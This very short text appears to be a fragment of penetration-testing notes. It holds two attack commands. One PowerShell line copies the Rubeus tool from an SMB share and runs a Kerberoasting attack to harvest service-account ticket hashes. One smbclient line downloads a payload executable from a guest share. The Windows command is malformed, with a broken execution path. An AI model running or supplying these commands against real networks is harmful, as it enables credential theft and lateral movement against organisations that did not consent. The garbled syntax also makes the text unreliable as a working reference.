> Copy-Item "\\<Server_IP>\share_name\Rubeus.exe" -Destination "C:\Path\To\Rubeus.exe" .\C:\\Path\To\Rubeus.exe kerberoast
$ smbclient //server_ip/share_name -U guest -c 'get payload.exe'    # Linux
